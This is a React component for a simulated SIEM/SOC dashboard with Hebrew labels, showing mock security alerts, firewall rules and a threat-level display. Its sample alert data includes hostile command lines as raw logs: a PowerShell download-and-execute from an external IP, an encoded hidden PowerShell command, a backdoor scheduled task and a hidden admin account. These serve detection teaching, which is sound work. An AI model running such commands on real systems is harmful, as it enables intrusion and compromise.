import { useState, useEffect, useRef } from "react";

const ALERTS = [
  { id:1,ts:"14:45:16",rule:"R07",name:"Brute Force — RDP",sev:"CRITICAL",mitre:"T1110",desc:"12 ניסיונות כניסה כושלים מ-IP חיצוני על RDP",src:"45.33.32.156",dst:"192.168.1.101",user:"administrator",port:"3389",raw:"Event 4625 × 12 | Source: 45.33.32.156 | Port: 3389 (RDP) | Duration: 45sec",tip:"חסום 45.33.32.156 בפיירוול. בדוק 4624 מאותו IP." },
  { id:2,ts:"14:44:58",rule:"R07",name:"Password Spray",sev:"HIGH",mitre:"T1110.003",desc:"ניסיונות כניסה עם אותה סיסמה למשתמשים שונים",src:"192.168.1.105",dst:"192.168.1.101",user:"admin,root,test",port:"445",raw:"Event 4625 × 5 | Source: 192.168.1.105 | Pattern: Password Spray | Port: 445",tip:"חסום 192.168.1.105. שנה סיסמאות." },
  { id:3,ts:"14:44:30",rule:"R02",name:"mimikatz.exe",sev:"CRITICAL",mitre:"T1003.001",desc:"mimikatz זוהה — גניבת סיסמאות מזיכרון",src:"192.168.1.101",dst:"-",user:"admin",port:"-",raw:"Sysmon 1 | C:\\Users\\admin\\Desktop\\mimikatz.exe | PID: 4821 | Parent: cmd.exe",tip:"Isolation מיידי. שנה כל סיסמה." },
  { id:4,ts:"14:43:55",rule:"R09",name:"Lateral Movement — PsExec",sev:"CRITICAL",mitre:"T1021.002",desc:"כניסת רשת Type 3 עם PsExec",src:"192.168.1.105",dst:"192.168.1.101",user:"domain_admin",port:"445",raw:"Event 4624 | Type:3 | User: domain_admin | Src: 192.168.1.105 | PSEXESVC.exe",tip:"Isolation לשני המכשירים!" },
  { id:5,ts:"14:43:20",rule:"R01",name:"PowerShell DownloadString",sev:"HIGH",mitre:"T1059.001",desc:"PowerShell מוריד payload מ-IP חיצוני",src:"192.168.1.101",dst:"185.141.27.99",user:"admin",port:"80",raw:"powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://185.141.27.99/payload.ps1')",tip:"חסום 185.141.27.99. הרוג PID." },
  { id:6,ts:"14:42:48",rule:"R06",name:"Reverse Shell — 4444",sev:"CRITICAL",mitre:"T1571",desc:"חיבור יוצא לפורט 4444 — Metasploit",src:"192.168.1.101",dst:"10.0.0.50",user:"admin",port:"4444",raw:"Sysmon 3 | powershell.exe (6712) → 10.0.0.50:4444 | TCP",tip:"הרוג PID 6712. חסום 10.0.0.50." },
  { id:7,ts:"14:42:10",rule:"R03",name:"Nmap Scan",sev:"MEDIUM",mitre:"T1046",desc:"סריקת רשת — 6 פורטים פתוחים",src:"192.168.1.100",dst:"192.168.1.0/24",user:"root",port:"-",raw:"nmap -sV -sC 192.168.1.0/24 | Found: 22,80,135,445,3389,5985",tip:"אם לא שלך — חקור." },
  { id:8,ts:"14:41:33",rule:"R05",name:"Registry Persistence",sev:"HIGH",mitre:"T1547.001",desc:"Backdoor נרשם ב-Registry Run",src:"192.168.1.101",dst:"-",user:"admin",port:"-",raw:"Sysmon 13 | HKLM\\...\\Run\\Updater = C:\\Temp\\backdoor.exe",tip:"מחק Registry key + קובץ." },
  { id:9,ts:"14:40:55",rule:"R08",name:"CMD from Word",sev:"HIGH",mitre:"T1204.002",desc:"WINWORD.EXE הפעיל CMD — מאקרו זדוני",src:"192.168.1.101",dst:"-",user:"admin",port:"-",raw:"WINWORD.EXE (2288) → cmd.exe /c whoami & net user",tip:"סגור Word. בדוק docm." },
  { id:10,ts:"14:40:30",rule:"R13",name:"Executable in Temp",sev:"MEDIUM",mitre:"T1105",desc:"payload.exe נוצר ב-Temp",src:"192.168.1.101",dst:"-",user:"admin",port:"-",raw:"Sysmon 11 | Temp\\payload.exe | 487KB | Creator: powershell.exe",tip:"בדוק VirusTotal." },
  { id:11,ts:"14:39:44",rule:"R04",name:"Hidden User hacker$",sev:"HIGH",mitre:"T1136.001",desc:"משתמש hacker$ נוצר ($ = מוסתר)",src:"192.168.1.101",dst:"-",user:"admin→hacker$",port:"-",raw:"Event 4720 | New: hacker$ | Groups: Administrators",tip:"net user hacker$ /delete" },
  { id:12,ts:"14:39:10",rule:"R11",name:"Malicious Service",sev:"HIGH",mitre:"T1543.003",desc:"EvilService — Auto Start כ-SYSTEM",src:"192.168.1.101",dst:"-",user:"SYSTEM",port:"-",raw:"Event 7045 | EvilService | C:\\Windows\\Temp\\svc.exe | Auto",tip:"sc stop + delete." },
  { id:13,ts:"14:38:40",rule:"R10",name:"Scheduled Task",sev:"MEDIUM",mitre:"T1053.005",desc:"Task מתחזה ל-WindowsUpdate",src:"192.168.1.101",dst:"-",user:"admin",port:"-",raw:"schtasks /create /tn WindowsUpdate /tr backdoor.exe /sc onlogon /ru SYSTEM",tip:"schtasks /delete /tn WindowsUpdate" },
  { id:14,ts:"14:38:05",rule:"R12",name:"DNS C2 Beacon",sev:"MEDIUM",mitre:"T1071.004",desc:"DNS DGA — תקשורת C2",src:"192.168.1.101",dst:"8.8.8.8",user:"-",port:"53",raw:"Sysmon 22 | a8f3k2x9.beacon.c2server.attacker.xyz → 185.141.27.99",tip:"חסום 185.141.27.99." },
  { id:15,ts:"14:37:30",rule:"R06",name:"C2 — Port 8888",sev:"HIGH",mitre:"T1571",desc:"svchost → IP רוסי",src:"192.168.1.101",dst:"185.141.27.99",user:"SYSTEM",port:"8888",raw:"svchost.exe (1204) → 185.141.27.99:8888 | TCP | RU",tip:"svchost מזויף! חסום IP." },
  { id:16,ts:"14:36:55",rule:"R07",name:"Brute Force — SSH",sev:"HIGH",mitre:"T1110",desc:"8 ניסיונות SSH כושלים",src:"103.25.41.7",dst:"192.168.1.101",user:"root",port:"22",raw:"auth.log | Failed × 8 | From: 103.25.41.7 | User: root",tip:"חסום IP. הגדר fail2ban." },
  { id:17,ts:"14:36:20",rule:"R02",name:"SharpHound AD Recon",sev:"CRITICAL",mitre:"T1087.002",desc:"SharpHound אוסף מידע AD",src:"192.168.1.101",dst:"192.168.1.1",user:"admin",port:"389",raw:"SharpHound.exe -c All | LDAP: 192.168.1.1:389",tip:"Isolation + שינוי סיסמאות." },
  { id:18,ts:"14:35:50",rule:"R03",name:"Unknown Device",sev:"MEDIUM",mitre:"T1046",desc:"מכשיר חדש — MAC לא מוכר",src:"192.168.1.200",dst:"broadcast",user:"-",port:"-",raw:"ARP | 192.168.1.200 | MAC: AA:BB:CC:11:22:33 | Unknown",tip:"בדוק פיזית. Rogue Device?" },
  { id:19,ts:"14:35:10",rule:"R01",name:"PowerShell Encoded",sev:"HIGH",mitre:"T1059.001",desc:"EncodedCommand + Hidden + Bypass",src:"192.168.1.101",dst:"-",user:"admin",port:"-",raw:"powershell.exe -EP Bypass -W Hidden -Enc SQBuAHYAbwBr... | PID: 3847",tip:"Decode Base64. הרוג PID." },
  { id:20,ts:"14:34:30",rule:"R07",name:"Brute Force — SMB",sev:"HIGH",mitre:"T1110",desc:"6 ניסיונות SMB כושלים",src:"10.0.0.55",dst:"192.168.1.101",user:"administrator",port:"445",raw:"Event 4625 × 6 | 10.0.0.55 | Port: 445 | C000006A (bad pass)",tip:"חסום 10.0.0.55." },
];

const FW = [
  { id:"R01",act:"❌ BLOCK",proto:"TCP",src:"*",sp:"*",dst:"*",dp:"*",dir:"⬆⬇",gw:"*",sched:"Always",desc:"PowerShell — encoded, bypass, download, hidden",log:"Sysmon 1",mitre:"T1059.001" },
  { id:"R02",act:"❌ BLOCK",proto:"*",src:"*",sp:"*",dst:"*",dp:"*",dir:"LOCAL",gw:"*",sched:"Always",desc:"כלי תקיפה — mimikatz, rubeus, sharphound, psexec",log:"Sysmon 1",mitre:"T1588.002" },
  { id:"R03",act:"⚠️ ALERT",proto:"TCP/UDP",src:"*",sp:"*",dst:"LAN net",dp:"*",dir:"⬇ IN",gw:"*",sched:"Always",desc:"סריקת רשת — nmap, masscan, unknown MAC",log:"Sysmon 3",mitre:"T1046" },
  { id:"R04",act:"⚠️ ALERT",proto:"*",src:"*",sp:"*",dst:"LOCAL",dp:"*",dir:"LOCAL",gw:"*",sched:"Always",desc:"יצירת משתמש מקומי חדש — Event 4720",log:"Security",mitre:"T1136.001" },
  { id:"R05",act:"❌ BLOCK",proto:"*",src:"*",sp:"*",dst:"REGISTRY",dp:"Run/*",dir:"LOCAL",gw:"*",sched:"Always",desc:"שינוי Registry Run/RunOnce — persistence",log:"Sysmon 13",mitre:"T1547.001" },
  { id:"R06",act:"❌ BLOCK",proto:"TCP",src:"LAN net",sp:"*",dst:"*",dp:"4444,5555,8888,1337",dir:"⬆ OUT",gw:"WAN",sched:"Always",desc:"חיבור לפורטים חשודים — reverse shell / C2",log:"Sysmon 3",mitre:"T1571" },
  { id:"R07",act:"❌ BLOCK",proto:"TCP",src:"*",sp:"*",dst:"LAN net",dp:"22,445,3389",dir:"⬇ IN",gw:"*",sched:"Always",desc:"Brute Force — RDP / SSH / SMB (4625 × 5+)",log:"Security",mitre:"T1110" },
  { id:"R08",act:"❌ BLOCK",proto:"*",src:"Office Apps",sp:"*",dst:"cmd/ps",dp:"*",dir:"LOCAL",gw:"*",sched:"Always",desc:"CMD/PowerShell מ-Word/Excel — macro זדוני",log:"Sysmon 1",mitre:"T1204.002" },
  { id:"R09",act:"⚠️ ALERT",proto:"TCP",src:"*",sp:"*",dst:"LAN net",dp:"445,5985,135",dir:"⬇ IN",gw:"*",sched:"Always",desc:"Lateral Movement — PsExec, WMI, WinRM",log:"Security",mitre:"T1021" },
  { id:"R10",act:"⚠️ ALERT",proto:"*",src:"*",sp:"*",dst:"LOCAL",dp:"*",dir:"LOCAL",gw:"*",sched:"Always",desc:"Scheduled Task — schtasks /create persistence",log:"Sysmon 1",mitre:"T1053.005" },
  { id:"R11",act:"⚠️ ALERT",proto:"*",src:"*",sp:"*",dst:"LOCAL",dp:"*",dir:"LOCAL",gw:"*",sched:"Always",desc:"שירות חדש — Event 7045 Auto Start",log:"System",mitre:"T1543.003" },
  { id:"R12",act:"⚠️ ALERT",proto:"UDP",src:"LAN net",sp:"*",dst:"*",dp:"53",dir:"⬆ OUT",gw:"WAN",sched:"Always",desc:"DNS חשוד — DGA / C2 beacon (domain > 50)",log:"Sysmon 22",mitre:"T1071.004" },
  { id:"R13",act:"⚠️ ALERT",proto:"*",src:"*",sp:"*",dst:"Temp/*",dp:"*.exe/*.dll",dir:"LOCAL",gw:"*",sched:"Always",desc:"קובץ הרצה נוצר בתיקיית Temp",log:"Sysmon 11",mitre:"T1105" },
];

const SV = { CRITICAL:{c:"#ff1744",bg:"#ff17441a",e:"🔴"},HIGH:{c:"#ff9100",bg:"#ff91001a",e:"🟠"},MEDIUM:{c:"#ffd600",bg:"#ffd6001a",e:"🟡"} };

function Clock(){const[t,setT]=useState(new Date());useEffect(()=>{const i=setInterval(()=>setT(new Date()),1000);return()=>clearInterval(i)},[]);return<span style={{fontSize:15,color:"#00e676"}}>{t.toLocaleTimeString("en-GB")}</span>}

export default function App(){
  const[tab,setTab]=useState("dash");
  const[sel,setSel]=useState(null);
  const[alerts,setAlerts]=useState(ALERTS.slice(0,2));
  const[ruleOpen,setRuleOpen]=useState(null);
  const idx=useRef(2);

  useEffect(()=>{const iv=setInterval(()=>{if(idx.current<ALERTS.length){setAlerts(p=>[ALERTS[idx.current],...p]);idx.current++}},2200);return()=>clearInterval(iv)},[]);

  const stats={total:alerts.length,critical:alerts.filter(a=>a.sev==="CRITICAL").length,high:alerts.filter(a=>a.sev==="HIGH").length,medium:alerts.filter(a=>a.sev==="MEDIUM").length};
  const topIPs={};alerts.forEach(a=>{if(a.src&&a.src!=="-")topIPs[a.src]=(topIPs[a.src]||0)+1});
  const ips=Object.entries(topIPs).sort((a,b)=>b[1]-a[1]).slice(0,5);
  const tl=stats.critical>=3?"CRITICAL":stats.critical>=1?"HIGH":"MEDIUM";
  const f={fontFamily:"'Share Tech Mono',monospace"};
  const cd={background:"#0b100b",border:"1px solid #152015",borderRadius:6,overflow:"hidden",marginBottom:10};

  return(
  <div style={{minHeight:"100vh",background:"#080b08",color:"#c8d6c8",...f}}>
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
  <div style={{position:"fixed",inset:0,pointerEvents:"none",zIndex:999,overflow:"hidden"}}><div style={{position:"absolute",width:"100%",height:2,background:"linear-gradient(90deg,transparent,#00e67630,transparent)",animation:"sc 5s linear infinite"}}/></div>
  <style>{`@keyframes sc{0%{top:-2px}100%{top:100vh}}@keyframes fi{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:translateY(0)}}@keyframes pu{0%,100%{opacity:1}50%{opacity:.3}}@keyframes bl{0%,100%{border-color:#ff174440}50%{border-color:#ff1744}}*{box-sizing:border-box}::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:#1a2e1a;border-radius:2px}`}</style>

  {/* HEADER */}
  <div style={{background:"#0a0f0a",borderBottom:"2px solid #00e676",padding:"10px 16px",display:"flex",justifyContent:"space-between",alignItems:"center",position:"sticky",top:0,zIndex:100,boxShadow:"0 0 40px #00e67615"}}>
    <div style={{display:"flex",alignItems:"center",gap:10}}><span style={{fontFamily:"'Orbitron'",fontWeight:900,fontSize:20,color:"#00e676",textShadow:"0 0 20px #00e67660",letterSpacing:3}}>🛡️ SIEM</span><span style={{fontSize:10,color:"#00e67050"}}>v1.0</span></div>
    <div style={{display:"flex",alignItems:"center",gap:12}}><Clock/><div style={{display:"flex",alignItems:"center",gap:5,background:"#00e67612",border:"1px solid #00e67630",borderRadius:4,padding:"3px 8px"}}><div style={{width:7,height:7,borderRadius:"50%",background:"#00e676",boxShadow:"0 0 8px #00e676",animation:"pu 2s infinite"}}/><span style={{fontSize:10,color:"#00e676"}}>ONLINE</span></div></div>
  </div>

  {/* TABS */}
  <div style={{display:"flex",background:"#090d09",borderBottom:"1px solid #152015"}}>
    {[["dash","📊 DASH"],["feed","🔍 SOC FEED"],["rules","🔥 FIREWALL RULES"]].map(([id,label])=>(
      <button key={id} onClick={()=>{setTab(id);setSel(null);setRuleOpen(null)}} style={{flex:1,padding:"11px 4px",border:"none",cursor:"pointer",...f,fontSize:10,letterSpacing:1,background:tab===id?"#00e67612":"transparent",color:tab===id?"#00e676":"#3a5a3a",borderBottom:tab===id?"2px solid #00e676":"2px solid transparent"}}>{label}</button>
    ))}
  </div>

  <div style={{padding:14}}>

  {/* ══════ DASHBOARD ══════ */}
  {tab==="dash"&&<>
    <div style={{textAlign:"center",padding:"14px 0 18px",borderBottom:`1px solid ${SV[tl].c}25`,marginBottom:14}}>
      <div style={{fontSize:9,color:"#3a5a3a",letterSpacing:4,marginBottom:6}}>THREAT LEVEL</div>
      <div style={{fontFamily:"'Orbitron'",fontWeight:900,fontSize:26,letterSpacing:5,color:SV[tl].c,textShadow:`0 0 30px ${SV[tl].c}50`}}>{tl}</div>
    </div>
    <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:8,marginBottom:14}}>
      {[{l:"TOTAL",v:stats.total,c:"#00e676"},{l:"CRITICAL",v:stats.critical,c:"#ff1744"},{l:"HIGH",v:stats.high,c:"#ff9100"},{l:"MEDIUM",v:stats.medium,c:"#ffd600"}].map((s,i)=>(
        <div key={i} style={{...cd,padding:"12px",textAlign:"center",animation:`fi .4s ease ${i*.08}s both`,border:`1px solid ${s.c}25`}}>
          <div style={{fontFamily:"'Orbitron'",fontWeight:700,fontSize:26,color:s.c}}>{s.v}</div>
          <div style={{fontSize:9,color:"#3a5a3a",letterSpacing:2,marginTop:3}}>{s.l}</div>
        </div>
      ))}
    </div>
    <div style={cd}>
      <div style={{padding:"8px 12px",borderBottom:"1px solid #152015"}}><span style={{fontSize:11,color:"#ff1744",letterSpacing:2}}>⚠️ TOP ATTACKER IPs</span></div>
      {ips.map(([ip,n],i)=><div key={ip} style={{padding:"7px 12px",borderBottom:"1px solid #0a140a",display:"flex",justifyContent:"space-between",animation:`fi .3s ease ${i*.08}s both`}}><span style={{fontSize:12,color:"#ff9100",direction:"ltr"}}>{ip}</span><span style={{fontSize:9,padding:"2px 6px",borderRadius:3,background:n>=5?"#ff174420":"#ff910020",color:n>=5?"#ff1744":"#ff9100"}}>{n} hits</span></div>)}
    </div>
    <div style={cd}>
      <div style={{padding:"8px 12px",borderBottom:"1px solid #152015",display:"flex",justifyContent:"space-between"}}><span style={{fontSize:11,color:"#00e676",letterSpacing:2}}>🔴 LATEST</span><button onClick={()=>setTab("feed")} style={{background:"none",border:"1px solid #00e67630",color:"#00e676",...f,fontSize:9,padding:"2px 7px",borderRadius:3,cursor:"pointer"}}>ALL →</button></div>
      {alerts.slice(0,5).map((a,i)=><div key={a.id} onClick={()=>{setSel(a);setTab("feed")}} style={{padding:"8px 12px",borderBottom:"1px solid #080c08",display:"flex",alignItems:"center",gap:8,cursor:"pointer",animation:i===0?"fi .4s ease":undefined}}><span>{SV[a.sev]?.e}</span><div style={{flex:1,minWidth:0}}><div style={{fontSize:11,color:SV[a.sev]?.c,fontWeight:"bold"}}>{a.rule} — {a.name}</div><div style={{fontSize:10,color:"#3a5a3a",whiteSpace:"nowrap",overflow:"hidden",textOverflow:"ellipsis",direction:"rtl"}}>{a.desc}</div></div>{a.src&&a.src!=="-"&&<span style={{fontSize:9,color:"#ff910060",direction:"ltr",flexShrink:0}}>{a.src}</span>}</div>)}
    </div>
  </>}

  {/* ══════ SOC FEED ══════ */}
  {tab==="feed"&&<>
    <div style={{display:"flex",justifyContent:"space-between",marginBottom:10}}><span style={{fontSize:11,color:"#00e676",letterSpacing:2}}>🔍 SOC LIVE FEED</span><span style={{fontSize:9,color:"#3a5a3a"}}>לחץ לחקירה</span></div>
    {alerts.map((a,i)=>{const o=sel?.id===a.id;const s=SV[a.sev];return(
      <div key={a.id} onClick={()=>setSel(o?null:a)} style={{...cd,borderLeft:`4px solid ${s.c}`,padding:"10px 12px",cursor:"pointer",marginBottom:6,border:o?`1px solid ${s.c}`:`1px solid ${s.c}25`,borderLeftWidth:4,boxShadow:o?`0 0 25px ${s.c}15`:undefined,animation:i===0?"fi .4s ease":a.sev==="CRITICAL"&&!o?"bl 2s infinite":undefined}}>
        <div style={{display:"flex",justifyContent:"space-between",marginBottom:4}}>
          <div style={{display:"flex",alignItems:"center",gap:6}}><span>{s.e}</span><span style={{fontSize:9,padding:"1px 5px",borderRadius:3,background:s.bg,color:s.c,fontWeight:"bold"}}>{a.sev}</span><span style={{fontSize:9,color:"#3a5a3a"}}>{a.mitre}</span></div>
          <span style={{fontSize:9,color:"#2a3e2a"}}>{a.ts}</span>
        </div>
        <div style={{fontSize:12,color:s.c,fontWeight:"bold",marginBottom:3}}>{a.rule} — {a.name}</div>
        <div style={{fontSize:10,color:"#6a8a6a",direction:"rtl"}}>{a.desc}</div>
        <div style={{display:"flex",gap:5,marginTop:6,flexWrap:"wrap"}}>
          {a.src&&a.src!=="-"&&<span style={{fontSize:9,padding:"2px 6px",borderRadius:3,background:"#ff174412",border:"1px solid #ff174425",color:"#ff9100",direction:"ltr"}}>⬆ {a.src}</span>}
          {a.dst&&a.dst!=="-"&&<span style={{fontSize:9,padding:"2px 6px",borderRadius:3,background:"#00e67610",border:"1px solid #00e67620",color:"#00e676",direction:"ltr"}}>⬇ {a.dst}</span>}
          {a.port&&a.port!=="-"&&<span style={{fontSize:9,padding:"2px 6px",borderRadius:3,background:"#ffd60010",border:"1px solid #ffd60020",color:"#ffd600",direction:"ltr"}}>:{a.port}</span>}
          {a.user&&a.user!=="-"&&<span style={{fontSize:9,padding:"2px 6px",borderRadius:3,background:"#90caf910",border:"1px solid #90caf920",color:"#90caf9"}}>👤 {a.user}</span>}
        </div>
        {o&&<div style={{marginTop:10,paddingTop:10,borderTop:`1px solid ${s.c}20`,animation:"fi .3s ease"}}>
          <div style={{background:"#060906",border:"1px solid #152015",borderRadius:4,padding:"8px 10px",marginBottom:6}}>
            <div style={{fontSize:8,color:"#2a3e2a",letterSpacing:2,marginBottom:4}}>RAW LOG</div>
            <div style={{fontSize:10,color:"#7a9a7a",wordBreak:"break-all",direction:"ltr",lineHeight:1.6}}>{a.raw}</div>
          </div>
          <div style={{display:"flex",gap:6,marginBottom:6}}>
            <div style={{flex:1,background:"#060906",border:"1px solid #152015",borderRadius:4,padding:"8px 10px"}}><div style={{fontSize:8,color:"#2a3e2a",letterSpacing:2,marginBottom:3}}>MITRE</div><div style={{fontSize:13,color:"#00e676"}}>{a.mitre}</div></div>
            <div style={{flex:1,background:"#060906",border:"1px solid #152015",borderRadius:4,padding:"8px 10px"}}><div style={{fontSize:8,color:"#2a3e2a",letterSpacing:2,marginBottom:3}}>PORT</div><div style={{fontSize:13,color:"#ffd600"}}>{a.port!=="-"?`:${a.port}`:"N/A"}</div></div>
          </div>
          <div style={{background:"#00e67608",border:"1px solid #00e67625",borderRadius:4,padding:"8px 10px",marginBottom:8}}>
            <div style={{fontSize:8,color:"#00e676",letterSpacing:2,marginBottom:4}}>🛡️ המלצת אנליסט</div>
            <div style={{fontSize:10,color:"#7a9a7a",direction:"rtl",lineHeight:1.6}}>{a.tip}</div>
          </div>
          <div style={{display:"flex",gap:6}}>
            <button style={{flex:1,padding:10,borderRadius:4,...f,fontSize:11,cursor:"pointer",background:"#ff174418",color:"#ff1744",border:"1px solid #ff174440"}}>⛔ חסום IP</button>
            <button style={{flex:1,padding:10,borderRadius:4,...f,fontSize:11,cursor:"pointer",background:"#ffd60010",color:"#ffd600",border:"1px solid #ffd60040"}}>📋 דווח</button>
            <button style={{flex:1,padding:10,borderRadius:4,...f,fontSize:11,cursor:"pointer",background:"#0b100b",color:"#5a7a5a",border:"1px solid #152015"}}>✅ סגור</button>
          </div>
        </div>}
      </div>
    )})}
  </>}

  {/* ══════ FIREWALL RULES (pfSense Style) ══════ */}
  {tab==="rules"&&<>
    <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:10}}>
      <span style={{fontSize:11,color:"#00e676",letterSpacing:2}}>🔥 FIREWALL RULES — pfSense Style</span>
      <span style={{fontSize:10,padding:"2px 7px",borderRadius:3,background:"#00e67612",color:"#00e676"}}>13/13 ✓</span>
    </div>

    {/* Table Header */}
    <div style={{background:"#0d140d",border:"1px solid #00e67630",borderRadius:"6px 6px 0 0",padding:"8px 10px",display:"grid",gridTemplateColumns:"18px 52px 42px 1fr",gap:6,alignItems:"center",borderBottom:"2px solid #00e676"}}>
      <span style={{fontSize:8,color:"#00e676"}}>⚡</span>
      <span style={{fontSize:8,color:"#00e676",letterSpacing:1}}>ACTION</span>
      <span style={{fontSize:8,color:"#00e676",letterSpacing:1}}>PROTO</span>
      <span style={{fontSize:8,color:"#00e676",letterSpacing:1}}>DESCRIPTION</span>
    </div>

    {FW.map((r,i)=>{
      const isBlock=r.act.includes("BLOCK");
      const hits=alerts.filter(a=>a.rule===r.id).length;
      const open=ruleOpen===r.id;
      return(
      <div key={r.id} style={{animation:`fi .3s ease ${i*.04}s both`}}>
        <div onClick={()=>setRuleOpen(open?null:r.id)} style={{
          background:open?"#0d140d":"#0a0f0a",
          border:`1px solid ${isBlock?"#ff174425":"#ffd60025"}`,
          borderTop:"none",
          borderRadius:i===FW.length-1&&!open?"0 0 6px 6px":0,
          padding:"8px 10px",
          display:"grid",gridTemplateColumns:"18px 52px 42px 1fr",gap:6,alignItems:"center",
          cursor:"pointer",
          transition:"all 0.15s",
        }}>
          {/* Status dot */}
          <div style={{width:8,height:8,borderRadius:"50%",background:"#00e676",boxShadow:"0 0 4px #00e676"}}/>
          {/* Action */}
          <span style={{fontSize:9,padding:"2px 4px",borderRadius:3,textAlign:"center",background:isBlock?"#ff174420":"#ffd60015",color:isBlock?"#ff1744":"#ffd600",fontWeight:"bold",whiteSpace:"nowrap"}}>{isBlock?"❌ BLOCK":"⚠️ ALERT"}</span>
          {/* Proto */}
          <span style={{fontSize:9,color:"#8aaa8a",textAlign:"center"}}>{r.proto}</span>
          {/* Desc */}
          <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",minWidth:0}}>
            <div style={{minWidth:0}}>
              <span style={{fontSize:10,color:"#00e676",fontWeight:"bold"}}>{r.id} </span>
              <span style={{fontSize:9,color:"#6a8a6a",whiteSpace:"nowrap",overflow:"hidden",textOverflow:"ellipsis"}}>{r.desc.substring(0,35)}{r.desc.length>35?"...":""}</span>
            </div>
            {hits>0&&<span style={{fontSize:8,padding:"1px 4px",borderRadius:3,background:"#ff174420",color:"#ff1744",flexShrink:0,marginLeft:4}}>{hits}</span>}
          </div>
        </div>

        {/* ══ Expanded Rule Detail (pfSense style) ══ */}
        {open&&<div style={{background:"#060b06",border:"1px solid #00e67625",borderTop:"none",padding:"12px",animation:"fi .3s ease"}}>
          <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:6,marginBottom:8}}>
            {[
              {l:"Source",v:r.src},{l:"Src Port",v:r.sp},
              {l:"Destination",v:r.dst},{l:"Dst Port",v:r.dp},
              {l:"Direction",v:r.dir},{l:"Gateway",v:r.gw},
              {l:"Schedule",v:r.sched},{l:"Log Source",v:r.log},
            ].map((field,fi)=>(
              <div key={fi} style={{background:"#080c08",border:"1px solid #152015",borderRadius:4,padding:"6px 8px"}}>
                <div style={{fontSize:7,color:"#2a3e2a",letterSpacing:2,marginBottom:2}}>{field.l.toUpperCase()}</div>
                <div style={{fontSize:11,color:"#8aaa8a",direction:"ltr"}}>{field.v}</div>
              </div>
            ))}
          </div>
          {/* Full description */}
          <div style={{background:"#080c08",border:"1px solid #152015",borderRadius:4,padding:"6px 8px",marginBottom:6}}>
            <div style={{fontSize:7,color:"#2a3e2a",letterSpacing:2,marginBottom:2}}>DESCRIPTION</div>
            <div style={{fontSize:10,color:"#8aaa8a",direction:"rtl"}}>{r.desc}</div>
          </div>
          <div style={{display:"flex",gap:6}}>
            <div style={{flex:1,background:"#080c08",border:"1px solid #152015",borderRadius:4,padding:"6px 8px"}}>
              <div style={{fontSize:7,color:"#2a3e2a",letterSpacing:2,marginBottom:2}}>MITRE ATT&CK</div>
              <div style={{fontSize:12,color:"#00e676"}}>{r.mitre}</div>
            </div>
            <div style={{flex:1,background:"#080c08",border:"1px solid #152015",borderRadius:4,padding:"6px 8px"}}>
              <div style={{fontSize:7,color:"#2a3e2a",letterSpacing:2,marginBottom:2}}>HITS</div>
              <div style={{fontSize:12,color:hits>0?"#ff9100":"#3a5a3a"}}>{hits} alerts triggered</div>
            </div>
          </div>
        </div>}
      </div>
    )})}
  </>}

  </div>
  <div style={{textAlign:"center",padding:"16px 14px 28px",borderTop:"1px solid #152015",marginTop:16}}>
    <div style={{fontSize:9,color:"#1a2e1a",letterSpacing:3}}>📡 CONNECTED • {alerts.length} ALERTS • 13 RULES • 1 ENDPOINT</div>
  </div>
  </div>);
}
